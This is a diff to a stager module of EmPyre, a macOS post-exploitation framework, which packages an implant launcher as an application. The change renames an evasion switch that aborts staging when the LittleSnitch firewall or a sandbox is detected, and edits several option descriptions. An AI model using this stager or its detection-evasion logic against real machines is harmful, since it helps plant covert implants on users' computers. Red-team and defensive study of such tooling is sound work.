@@ -10,7 +10,7 @@ class Stager:
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates an EmPyre Application Bundle.'),
+            'Description': ('Generates an EmPyre Application.'),
 
             'Comments': [
                 ''
@@ -27,7 +27,7 @@ class Stager:
                 'Value'         :   ''
             },
             'AppIcon' : {
-                'Description'   :   'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to the AppIcon.icns in the /data/misc/bundle-resources/ directory',
+                'Description'   :   'Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -36,8 +36,8 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   '/tmp/out.zip'
             },
-            'SafeChecks' : {
-                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+            'LittleSnitch' : {
+                'Description'   :   'Switch. Checks for LittleSnitch, exit the staging process if true. Defaults to True.',
                 'Required'      :   True,
                 'Value'         :   'True'
             },
@@ -69,13 +69,13 @@ class Stager:
         listenerName = self.options['Listener']['Value']
         savePath = self.options['OutFile']['Value']
         userAgent = self.options['UserAgent']['Value']
-        SafeChecks = self.options['SafeChecks']['Value']
+        LittleSnitch = self.options['LittleSnitch']['Value']
         arch = self.options['Architecture']['Value']
         icnsPath = self.options['AppIcon']['Value']
         
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  safechecks=SafeChecks)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  littlesnitch=LittleSnitch)
 
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
